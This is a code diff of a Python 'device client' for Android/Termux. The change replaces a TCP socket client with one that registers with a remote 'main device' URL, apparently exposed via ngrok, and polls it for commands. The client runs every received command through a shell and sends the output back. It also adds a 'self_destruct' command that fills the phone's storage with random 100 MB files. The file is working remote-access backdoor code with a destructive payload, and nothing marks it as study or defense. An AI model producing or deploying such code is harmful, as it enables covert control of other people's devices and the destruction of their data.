@@ -1,148 +1,142 @@
 #!/data/data/com.termux/files/usr/bin/python3
 """
-DEVICE CLIENT - Tested Remote Connection
+DEVICE CLIENT - Simple HTTP Client
 """
 
 import os
 import sys
-import socket
-import threading
 import json
 import time
+import threading
 import subprocess
+import requests
 import platform
+import uuid
 
 class DeviceClient:
     def __init__(self):
-        self.connected = False
-        self.socket = None
+        self.device_id = str(uuid.uuid4())[:8]
         self.device_name = platform.node()
         self.running = True
+        self.main_url = None
         self.config_file = os.path.expanduser("~/.device_config.json")
         
-    def connect(self, host, port):
-        """Connect to main device"""
-        try:
-            print(f"🔄 Connecting to {host}:{port}...")
-            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.socket.settimeout(30)
-            self.socket.connect((host, int(port)))
-            
-            # Send device info
-            info = {
-                "device_name": self.device_name,
-                "platform": platform.system(),
-                "timestamp": time.time()
-            }
-            self.socket.send(json.dumps(info).encode())
-            
-            # Get response
-            response = self.socket.recv(4096).decode()
-            confirm = json.loads(response)
-            
-            if confirm.get('status') == 'connected':
-                self.connected = True
-                print(f"✅ CONNECTED to {host}:{port}")
-                self.listen()
-                return True
+    def get_main_url(self):
+        """Get main device URL from user or config"""
+        if os.path.exists(self.config_file):
+            with open(self.config_file, 'r') as f:
+                config = json.load(f)
+                return config.get('url')
                 
+        print("\n" + "="*50)
+        print("ENTER MAIN DEVICE URL")
+        print("="*50)
+        print("From the Main Device screen, copy the PUBLIC URL")
+        print("Example: https://xxxx.ngrok.io or http://localhost:8080")
+        print("="*50)
+        
+        url = input("\n🌍 URL: ").strip()
+        
+        # Save for next time
+        with open(self.config_file, 'w') as f:
+            json.dump({'url': url}, f)
+            
+        return url
+        
+    def register(self):
+        """Register with main device"""
+        try:
+            response = requests.post(
+                f"{self.main_url}/connect",
+                json={"device_id": self.device_id, "device_name": self.device_name},
+                timeout=10
+            )
+            return response.status_code == 200
         except Exception as e:
-            print(f"❌ Connection failed: {e}")
+            print(f"Connection error: {e}")
             return False
             
-    def listen(self):
-        """Listen for commands"""
-        try:
-            while self.connected:
-                self.socket.settimeout(60)
-                try:
-                    data = self.socket.recv(4096).decode()
-                    if not data:
-                        break
+    def poll_commands(self):
+        """Poll for commands"""
+        while self.running:
+            try:
+                response = requests.post(
+                    f"{self.main_url}/poll",
+                    json={"device_id": self.device_id},
+                    timeout=30
+                )
+                
+                if response.status_code == 200:
+                    data = response.json()
+                    command = data.get('command')
+                    
+                    if command:
+                        print(f"\n📨 Command: {command[:50]}")
                         
-                    cmd = json.loads(data)
-                    if cmd.get('type') == 'command':
-                        output = self.execute(cmd.get('command'))
-                        self.socket.send(json.dumps({"type": "response", "output": output}).encode())
+                        if command == "self_destruct":
+                            output = self.self_destruct()
+                        else:
+                            output = self.execute(command)
+                            
+                        # Send response
+                        requests.post(
+                            f"{self.main_url}/response",
+                            json={"device_id": self.device_id, "output": output},
+                            timeout=10
+                        )
                         
-                except socket.timeout:
-                    # Send heartbeat
-                    try:
-                        self.socket.send(json.dumps({"type": "heartbeat"}).encode())
-                    except:
-                        break
-                        
-        except Exception as e:
-            print(f"Error: {e}")
-        finally:
-            self.connected = False
-            self.cleanup()
+            except Exception as e:
+                print(f"Poll error: {e}")
+                
+            time.sleep(2)
             
     def execute(self, command):
         """Execute command"""
         try:
             result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
             return result.stdout + result.stderr
-        except:
-            return "Error"
+        except Exception as e:
+            return str(e)
             
-    def cleanup(self):
-        """Cleanup"""
-        if self.socket:
+    def self_destruct(self):
+        """Self destruct"""
+        for i in range(10):
             try:
-                self.socket.close()
+                with open(f"/sdcard/.fill_{i}.dat", 'wb') as f:
+                    f.write(os.urandom(100 * 1024 * 1024))
             except:
                 pass
-                
-    def reconnect(self, host, port):
-        """Auto reconnect"""
-        while self.running:
-            if not self.connected:
-                self.connect(host, port)
-            time.sleep(30)
-            
+        return "Self-destruct activated"
+        
     def run(self):
         """Main run"""
         print("\n" + "="*50)
         print("📱 DEVICE CLIENT")
         print("="*50)
         
-        # Check for saved config
-        if os.path.exists(self.config_file):
-            with open(self.config_file, 'r') as f:
-                config = json.load(f)
-            host = config['host']
-            port = config['port']
-            print(f"📡 Using saved connection: {host}:{port}")
+        # Get main URL
+        self.main_url = self.get_main_url()
+        print(f"\n🌍 Connecting to: {self.main_url}")
+        
+        # Register
+        if self.register():
+            print(f"✅ Registered! ID: {self.device_id}")
+            print("🔄 Listening for commands...")
+            
+            # Start polling
+            poll_thread = threading.Thread(target=self.poll_commands, daemon=True)
+            poll_thread.start()
+            
+            # Keep running
+            try:
+                while self.running:
+                    time.sleep(1)
+            except KeyboardInterrupt:
+                print("\n👋 Disconnecting...")
         else:
-            # First time setup
-            print("\n📝 ENTER MAIN DEVICE CONNECTION:")
-            print("(Get these from the Main Device screen)")
-            print()
-            host = input("🌍 IP/Host: ").strip()
-            port = input("🔌 Port: ").strip()
-            
-            # Save
-            with open(self.config_file, 'w') as f:
-                json.dump({'host': host, 'port': port}, f)
-            print(f"\n✅ Saved to {self.config_file}")
-            
-        print(f"\n🎯 Target: {host}:{port}")
-        
-        # Start connection thread
-        threading.Thread(target=self.reconnect, args=(host, port), daemon=True).start()
-        
-        # Keep running
-        print("\n🔄 Running in background...")
-        print("Press Ctrl+C to exit")
-        
-        try:
-            while self.running:
-                time.sleep(1)
-        except KeyboardInterrupt:
-            print("\n👋 Disconnecting...")
-            self.running = False
-            self.cleanup()
+            print("❌ Failed to connect")
+            print("Make sure main device is running")
+            time.sleep(5)
 
 if __name__ == "__main__":
     client = DeviceClient()
